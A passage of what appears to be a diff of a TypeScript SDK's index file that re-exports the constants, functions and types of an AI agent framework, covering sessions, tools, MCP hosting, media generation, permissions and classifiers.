CreatePlatformImageGenProviderOptions, CreatePlatformSearchProviderOptions, CreatePlatformSpeechToTextProviderOptions, CreatePlatformTextToSpeechProviderOptions, CreatePlatformVideoGenProviderOptions, CreateSdkPermissionGateOptions, CreateSessionOptions, CreateSpeechToTextToolOptions, CreateTextToSpeechToolOptions, CreateVideoGenToolOptions, DecisionSource, DefineSkillOptions, DefineToolOptions, DefinedSkill, DefinedTool, DeliveryConfig, ErrorView, EventBody, EventEnvelope, FetchedAppBundle, ForkOptions, ForkResult, FsBlobStoreOptions, GateDecision, HistoryCommitMeta, HistoryPage, HistoryPageOptions, HistoryRewriteReason, HookOutcomeStatus, IRBlock, IRErrorKind, IRMessage, IRRequest, IRRole, IRStreamEvent, IRSystemSegment, IRToolContent, IRToolDef, IRToolResultBlock, IRUsage, IdleCompactionInput, IdleCompactionResult, ImageGenArgs, ImageGenData, ImageModelConstraints, ImageModelDescriptor, ImportCheckpointOptions, Integrity, JournalKind, JournalRecord, KernelEvent, KernelState, KeyPredicate, LoadConfigOptions, LoadQuery, LoadResult, LoadedConfig, ManagedQueryOptions, McpClientEvent, McpConnectFactory, McpConnection, McpEventObserver, McpHostOptions, McpServerConfig, McpSessionOption, MediaArtifact, MediaHintAudience, MediaHintFace, MediaModelDescriptor, MediaOutputHosting, MemoryBlobStoreOptions, ModelCallOptions, ModelClient, Narrator, NarratorOptions, NarratorVerbosity, PermissionDecision, PermissionGate, PermissionMode, PermissionOptions, PermissionRules, PlanCaps, PlanErrorCode, PlanStatus, PlanTier, PlatformAudioCallOptions, PlatformAudioClient, PlatformAudioFace, PlatformAudioResponse, PlatformCapabilityName, PlatformMediaProviderOptions, PlatformToolContext, PlatformWarning, PreparedAdjudication, Pricing, PromptCachingMode, PromptChannel, ProposedToolCall, ProtocolKind, ProviderProfile, PutOptions, PutResult, QueryBeforeCompactContext, QueryBeforeCompactHook, QueryCompactionOptions, QueryCounters, QueryHandle, QueryLifecycleOptions, QueryOptions, QueryResult, ResourceSettleOptions as QuerySettleOptions, ResourceSettlementResult as QuerySettlement, ResourceSettlementFailure as QuerySettlementFailure, Question, QuestionOption, RenderPayloadOptions, RequestPlatformAudioOptions, ResolvedBundle, ResolvedModel, RestoreOptions, RestoreResult, RunAgentOptions, SdkCleanupHandle, SdkErrorCode, SdkMcpAttachment, SdkSkillsOptions, SdkToolSet, SdkToolsOptions, SdkToolsetRef, SdkWarning, SegmentBlobStore, SegmentationOptions, SegmentedStorePolicy, SequentialToolHandler, SequentialToolResult, SessionCheckpointOptions, SessionCwdChange, SessionDrainOptions, SessionDrainResult, SessionEventSource, SessionHistoryStore, SessionIndexStore, SessionInputCapabilities, SessionInputContent, SessionInputReceipt, SessionInputRejectCode, SessionInputResult, SessionInputSubmission, SessionInputTarget, SessionLifecycleFailure, SessionLifecyclePhase, SessionNotice, SessionRecord, SessionRecordMeta, SessionStore, SessionStoreCommitMeta, SessionStoreCreateInit, SessionStoreForkInput, SessionView, SessionViewDeliveryOptions, SessionViewOptions, SessionViewReducerState, SessionViewSource, SessionViewState, SessionViewStatus, SetCwdResult, SetModelBinding, SkillsFileSystem, SpeakInput, SpeechAudio, SpeechData, SpeechToTextArgs, SpeechToTextModelDescriptor, StorageConformanceCase, StorageConformanceOptions, StorageConformanceReport, StoreErrorKind, StoreErrorOptions, StoreInput, StoredSessionMeta, StreamTransform, SystemPromptPolicy, TansrConfig, TerminalReason, TextDeliveryMode, TextToSpeechArgs, TextToSpeechModelDescriptor, ThinkingDeliveryMode, TodoView, TokenInvalidatingCode, Tool, ToolCallPartStatus, ToolCallView, ToolContext, ToolErrorType, ToolExecutionContext, ToolExecutionOutcome, ToolExecutor, ToolExecutorYield, ToolParameterSpec, ToolResult, ToolResultContent, TranscribeInput, TranscriptData, TranscriptSegment, TwpHeartbeatResult, UIMessage, UIMessagePart, UITextPart, UIThinkingPart, UIToolCallPart, UsageView, VideoGenArgs, VideoGenData, VideoModelConstraints, VideoModelDescriptor, Visibility };
+export { ADJUDICATION_CONSULT_TOKEN_ESTIMATE, ADJUDICATION_POSTURES, ADJUDICATOR_TIERS, ADJUDICATOR_UNAVAILABLE_WARNING, APP_PLATFORMS, APP_PLATFORM_TOPOLOGY, APP_SDK_CONTRACT_VERSION, APP_SINGLE_STAGE_INSTRUCTION, APP_SINGLE_STAGE_PROTOCOL_FINGERPRINT, APP_TOKEN_PLACEHOLDER_ENV, APP_TOKEN_PLACEHOLDER_VALUE, APP_TOKEN_REJECT_REASONS, APP_TOKEN_TRANSIENT_REASONS, AdjudicatorTierSchema, AgentSession, AppBundlePlanSchema, AppCapabilitiesSchema, AppConfigRequestError, AppPlatformSchema, AppTokenRequestSchema, AppTokenResponseSchema, CAPABILITY_BIT_TOOL_NAMES, CAPABILITY_PLATFORM_KEYS, CAPABILITY_TOOL_KEYS, CAPABILITY_TOPOLOGIES, CHECKPOINT_EXPORT_FORMAT, CLASSIFIER_PROTOCOL_FINGERPRINT, CLASSIFIER_TIMEOUT_POLICY, CLIENT_FEATURES, DEFAULT_APP_CAPABILITIES, DEFAULT_BUNDLE_CACHE_SCOPE, DEFAULT_BUNDLE_CACHE_TTL_MS, DEFAULT_MAX_TOKENS, DEFAULT_MAX_TURNS, DEVELOPER_ONLY_ADJUDICATOR_WARNING_CODES, EndUserIdSchema, HEADER_APP_TOKEN, HEADER_CLIENT_FEATURES, IMAGEGEN_TOOL_MAX_N, IMAGEGEN_TOOL_TIMEOUT_MS, ImageGenArgsSchema, ImageGenDataSchema, LOCAL_END_USER_KEY, McpHost, OUTPUT_TAIL_MAX_CHARS, PLAN_ERROR_CODES, PLAN_ERROR_HTTP_STATUS, PLAN_STATUSES, PLAN_TIERS, PLATFORM_MEDIA_PROVIDER_NAME, PLATFORM_SEARCH_PROVIDER_NAME, PlanCapsSchema, PlanStatusSchema, PlanTierSchema, PlatformRequestError, QueueChannel, SEGMENTED_STORE_DEFAULTS, SESSION_NOTICES_MAX, SINGLE_STAGE_PROTOCOL_FINGERPRINT, SPEECH_TO_TEXT_TOOL_TIMEOUT_MS, SdkLifecycleError, SequentialToolExecutor, SpeechAudioSchema, SpeechDataSchema, SpeechToTextArgsSchema, StoreError, TANSR_PROVIDER_ID, TEXT_TO_SPEECH_DEFAULT_MAX_CHARS, TEXT_TO_SPEECH_FORMATS, TEXT_TO_SPEECH_TOOL_TIMEOUT_MS, TOKEN_INVALIDATING_CODES, TOOLS_PLATFORM_DEPRECATED_CODE, TOOL_GUIDE_LABEL, TWO_STAGE_TIMEOUT_MS, TansrSdkError, TextToSpeechArgsSchema, TranscriptDataSchema, TranscriptSegmentSchema, UnavailableChannel, VIDEOGEN_TOOL_MAX_DURATION, VIDEOGEN_TOOL_TIMEOUT_MS, VideoGenArgsSchema, VideoGenDataSchema, accumulateUsage, alignHistoryPage, appBundlePricingUpdates, appBundleRegistryConfig, appSingleStageProtocolFingerprintFor, appendUserMessage, applicationPromptFailureMessage, assembleBundleAdjudicator, assembleManagedModel, assemblePlatformModel, assembleSdkSkills, assembleTokenTierAdjudicator, assembleTooling, attachSdkMcp, attachSdkMcpWithDiscover, attachSdkTaskTool, buildClientFromRegistry, buildSdkToolSet, buildToolGuideSegment, bundleKey, classifierProtocolFingerprintFor, countSpeechCharacters, createAppTokenFetch, createApplicationPromptRefresher, createBlockListClassifier, createBundleCache, createChaosBlobStore, createClassifierTranscriptRecorder, createFileCheckpointStore, createFileSessionStore, createFsBlobStore, createImageGenTool, createMcpHost, createMemoryBlobStore, createNarrator, createPlatformAudioClient, createPlatformImageGenProvider, createPlatformSearchProvider, createPlatformSpeechToTextProvider, createPlatformTextToSpeechProvider, createPlatformVideoGenProvider, createSdkPermissionGate, createSession, createSessionView, createSingleStageClassifier, createSpeechToTextTool, createTextToSpeechTool, createTwoStageClassifier, createUnavailablePlatformAudioClient, createVideoGenTool, defaultAppCapabilities, defineSkill, defineTool, describeApplicationPromptFailure, featuresFingerprintOf, fetchAppBundle, fetchTwpFeatures, fetchTwpHeartbeat, hintFor, hostedToolUniverse, inapplicableTrueBits, initialSessionViewState, isPlanErrorCode, isRenderableArtifact, isSessionHistoryStore, isTokenInvalidatingCode, isTransientAppTokenReason, markSourceFailure, normalizeAppCapabilitiesForPlatform, normalizeEtagValue, parseAppBundle, parseCacheControlMaxAgeMs, parseMediaArtifact, parseSpeechData, parseStage1Output, parseStage2Output, parseTranscriptData, planErrorGuidance, planSpeechInput, planUpgradeUrlOf, platformErrorOf, prepareAdjudication, prepareApplicationPromptTurn, providerSwitchedBody, query, readHistoryPage, reduceSessionView, renderAppContext, renderCallPayloadDetailed, renderClassifierStagePrompt, renderEngineFacts, requestPlatformAudio, resolveAdjudicationPosture, resolveAdjudicatorGovernance, resolveApplicationSystem, resolveBuiltinSelection, resolveInitialMessages, resolvePlatformSelection, resolveStageHandle, runAgent, runIdleCompaction, runStorageConformance, serializeTimeoutPolicy, setSessionViewDelivery, singleStageProtocolFingerprintFor, sliceHistoryPage, stripThinkingParts, subagentModelResolverOf, toStoreError, toToolDef, topologyOf, topologyToolUniverse, validateAdjudicationOptions, viewStateFromHistory, zeroAppCapabilities };
+export type { ActiveToolStatus, AdjudicationOptions, AdjudicationPosture, AdjudicationWarning, AdjudicatorGovernance, AdjudicatorGovernanceInput, AdjudicatorMoneyFold, AdjudicatorTier, AlignedHistoryPage, Answer, AppBundle, AppBundleAdjudicator, AppBundleContextScheme, AppBundleGovernance, AppBundleImageModel, AppBundleMediaModel, AppBundleModel, AppBundleModelPricing, AppBundlePlan, AppBundlePlatformModels, AppBundleSpeechToTextModel, AppBundleTextToSpeechModel, AppBundleVideoModel, AppCapabilities, AppPlatform, AppTokenRejectReason, AppTokenRequest, AppTokenResponse, ApplicationPromptFailure, ApplicationPromptFailureReason, ApplicationPromptInfo, ApplicationPromptRetry, ApplicationPromptSnapshot, ApplicationPromptTurnOptions, AskUserCallback, AssembleBundleAdjudicatorOptions, AssembleManagedModelOptions, AssemblePlatformModelOptions, AssembleToolingAdjudication, AssembleToolingOptions, AssembledBundleAdjudicator, AssembledManagedModel, AssembledPlatformModel, AssembledSkills, AssembledTooling, AttachSdkTaskToolConfig, AudioAsrConstraints, AudioTtsConstraints, BlobListEntry, BlobMeta, BlobStoreCapabilities, BlockListClassifierConfig, BuildSdkToolSetOptions, BuiltinToolName, BundleCache, BundleCacheKey, BundleCacheResolveInput, BundleCacheScope, BundleCacheStats, ByteRange, Capability, CapabilityPlatformKey, CapabilityToolKey, CapabilityTopology, CapabilityTopologyProfile, ChaosBlobStore, ChaosFaults, ChaosStats, Checkpoint, CheckpointInput, CheckpointMeta, CheckpointOptions, CheckpointRetention, CheckpointStore, CheckpointTrigger, ClassifierAssemblyMode, ClassifierLiveStages, ClassifierProtocol, ClassifierStageBudgetOverrides, ClassifierStageHandle, ClassifierTimeoutPolicy, ClassifierTranscriptRecorder, ClientFeature, StoredSessionMeta as ColdStoredSessionMeta, ColdTierEvent, ColdTierEventType, ColdTierStats, CompactNowOptions, CompactNowResult, CompactOptions, CompactResult, CompactionFailureReason, ConfigDiagnostic, ContextBudgetState, CreateBlockListClassifierOptions, CreateBundleCacheOptions, CreateFileCheckpointStoreOptions, CreateFileSessionStoreOptions, CreateImageGenToolOptions, CreatePlatformAudioClientOptions, CreatePlatformImageGenProviderOptions, CreatePlatformSearchProviderOptions, CreatePlatformSpeechToTextProviderOptions, CreatePlatformTextToSpeechProviderOptions, CreatePlatformVideoGenProviderOptions, CreateSdkPermissionGateOptions, CreateSessionOptions, CreateSpeechToTextToolOptions, CreateTextToSpeechToolOptions, CreateVideoGenToolOptions, DecisionSource, DefineSkillOptions, DefineToolOptions, DefinedSkill, DefinedTool, DeliveryConfig, ErrorView, EventBody, EventEnvelope, FetchedAppBundle, ForkOptions, ForkResult, FsBlobStoreOptions, GateDecision, HistoryCommitMeta, HistoryPage, HistoryPageOptions, HistoryRewriteReason, HookOutcomeStatus, IRBlock, IRErrorKind, IRMessage, IRRequest, IRRole, IRStreamEvent, IRSystemSegment, IRToolContent, IRToolDef, IRToolResultBlock, IRUsage, IdleCompactionInput, IdleCompactionResult, ImageGenArgs, ImageGenData, ImageModelConstraints, ImageModelDescriptor, ImportCheckpointOptions, Integrity, JournalKind, JournalRecord, KernelEvent, KernelState, KeyPredicate, LoadConfigOptions, LoadQuery, LoadResult, LoadedConfig, ManagedQueryOptions, McpClientEvent, McpConnectFactory, McpConnection, McpEventObserver, McpHostOptions, McpServerConfig, McpSessionOption, MediaArtifact, MediaHintAudience, MediaHintFace, MediaModelDescriptor, MediaOutputHosting, MemoryBlobStoreOptions, ModelCallOptions, ModelClient, ModelTransitionBackup, Narrator, NarratorOptions, NarratorVerbosity, PermissionDecision, PermissionGate, PermissionMode, PermissionOptions, PermissionRules, PlanCaps, PlanErrorCode, PlanStatus, PlanTier, PlatformAudioCallOptions, PlatformAudioClient, PlatformAudioFace, PlatformAudioResponse, PlatformCapabilityName, PlatformMediaProviderOptions, PlatformToolContext, PlatformWarning, PreparedAdjudication, Pricing, PromptCachingMode, PromptChannel, ProposedToolCall, ProtocolKind, ProviderProfile, PutOptions, PutResult, QueryBeforeCompactContext, QueryBeforeCompactHook, QueryCompactionOptions, QueryCounters, QueryHandle, QueryLifecycleOptions, QueryOptions, QueryResult, ResourceSettleOptions as QuerySettleOptions, ResourceSettlementResult as QuerySettlement, ResourceSettlementFailure as QuerySettlementFailure, Question, QuestionOption, RenderPayloadOptions, RequestPlatformAudioOptions, ResolvedBundle, ResolvedModel, RestoreOptions, RestoreResult, RunAgentOptions, SdkCleanupHandle, SdkErrorCode, SdkMcpAttachment, SdkSkillsOptions, SdkToolSet, SdkToolsOptions, SdkToolsetRef, SdkWarning, SegmentBlobStore, SegmentationOptions, SegmentedStorePolicy, SendBlocksResult, SequentialToolHandler, SequentialToolResult, SessionBudgetOptions, SessionCheckpointOptions, SessionContextState, SessionCwdChange, SessionDrainOptions, SessionDrainResult, SessionEventSource, SessionHistoryStore, SessionIndexStore, SessionInputCapabilities, SessionInputContent, SessionInputReceipt, SessionInputRejectCode, SessionInputResult, SessionInputSubmission, SessionInputTarget, SessionLifecycleFailure, SessionLifecyclePhase, SessionModelState, SessionNotice, SessionRecord, SessionRecordMeta, SessionStore, SessionStoreCommitMeta, SessionStoreCreateInit, SessionStoreForkInput, SessionUserBlock, SessionView, SessionViewDeliveryOptions, SessionViewOptions, SessionViewReducerState, SessionViewSource, SessionViewState, SessionViewStatus, SetCwdResult, SetModelBinding, SkillsFileSystem, SpeakInput, SpeechAudio, SpeechData, SpeechInputPlan, SpeechInputPlanResult, SpeechToTextArgs, SpeechToTextModelDescriptor, StorageConformanceCase, StorageConformanceOptions, StorageConformanceReport, StoreErrorKind, StoreErrorOptions, StoreInput, StoredSessionMeta, StreamTransform, SwitchModelOptions, SwitchModelResult, SystemPromptPolicy, TansrConfig, TerminalReason, TextDeliveryMode, TextToSpeechArgs, TextToSpeechModelDescriptor, ThinkingDeliveryMode, TodoView, TokenInvalidatingCode, Tool, ToolCallPartStatus, ToolCallView, ToolContext, ToolErrorType, ToolExecutionContext, ToolExecutionOutcome, ToolExecutor, ToolExecutorYield, ToolParameterSpec, ToolResult, ToolResultContent, TranscribeInput, TranscriptData, TranscriptSegment, TwpHeartbeatResult, UIMessage, UIMessagePart, UITextPart, UIThinkingPart, UIToolCallPart, UsageView, VideoGenArgs, VideoGenData, VideoModelConstraints, VideoModelDescriptor, Visibility };
